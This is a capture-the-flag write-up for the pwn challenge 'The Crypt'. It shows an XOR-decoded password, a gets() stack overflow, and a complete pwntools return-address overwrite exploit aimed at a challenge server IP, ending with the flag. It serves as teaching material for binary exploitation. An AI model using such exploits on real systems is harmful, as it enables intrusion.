# The Crypt

> **Category:** Pwn (Binary Exploitation) · **Points:** 100 · **Author:** @SpiffyLich · **Track:** [Pwn](README.md)

## The Scenario

An incident-response team found a mysterious program on several compromised machines. Running it shows a spooky "crypt" themed terminal game that asks for a secret code. The binary and a remote server address are given to attack once the mechanics are understood.

## Step 1: First look at the binary

Before writing a single line of exploit code: what platform is this binary for, and what security protections does it have enabled? The answer directly shapes the exploitation strategy.

```bash
$ file The_Crypt
The_Crypt: ELF 64-bit LSB executable, x86-64, ... not stripped

$ checksec --file=The_Crypt
RELRO: Partial RELRO
Stack: No canary found
NX:    NX enabled
PIE:   No PIE (0x400000)
```

Two details stand out immediately: "No canary found" means the stack has no protection against classic buffer overflows, and "No PIE" means every function in the program always loads at the exact same memory address, no address leak needed, addresses can be hard-coded.

## Step 2: Find the "secret code" check

Listing the program's own functions with `nm` and reading the disassembly of `de_crypt()` revealed something surprising: this function completely ignores whatever the player types. Instead, it copies a hidden global byte array, XOR-ing every byte with the constant `0x13`, into the comparison buffer. The "password check" is really just unlocking a fixed string that was always baked into the binary.

```python
s = "\\cv}LG{vLW||aLG|L]|d{vav"
print(bytes(b ^ 0x13 for b in s.encode()))
```

```
b'Open_The_Door_To_Nowhere'
```

The decoded secret code is literally `Open_The_Door_To_Nowhere`, and sure enough, the disassembly also contains an unused function called `nowhere()` which opens and prints a local file. The challenge name was the hint all along.

## Step 3: Find the real bug, a classic stack overflow

After entering the correct code, the program calls a function named `whispering_madness()`. Inside it, user input is read with `gets()`, a notoriously unsafe C function with no length limit, into a 64-byte buffer. Since there is no stack canary, the buffer can be overflowed, the saved return address overwritten, and execution redirected anywhere. Because there is no PIE, the target address is already known: `nowhere()`, at `0x401660`.

The layout of the stack frame gives the exact byte count before reaching the return address: 64 bytes to fill the buffer, plus 8 bytes for the saved base pointer (`rbp`) = 72 bytes of padding, followed by the address to jump to.

## Step 4: Build and run the exploit with pwntools

```python
from pwn import *
context.arch = 'amd64'
r = remote('159.65.228.107', 5001)

secret = b"Open_The_Door_To_Nowhere"
r.sendlineafter(b"Required): ", secret)

offset = 0x40 + 8            # 64-byte buffer + saved rbp
nowhere_addr = 0x401660
payload = b"A" * offset + p64(nowhere_addr)
r.sendline(payload)
r.interactive()
```

This exact payload was first tested against a local copy of the binary to confirm the offset was correct (it tried to open a local `flag.txt` and failed safely, proving the redirection worked) before running it against the real remote server, which held the actual flag file.

## Flag

```
deadface{d3crypt3d_1nt0_n0th1ng}
```

> **Lesson:** a missing stack canary plus a known, fixed memory layout (no PIE) is enough to hijack a program's execution flow with nothing more than carefully counted bytes.

---
[← Back to index](../../README.md)
